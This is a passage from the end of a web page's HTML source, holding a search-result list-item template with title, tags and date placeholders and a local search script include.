        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</script>

<script src="/js/search.js"></script>









</body>
</html>
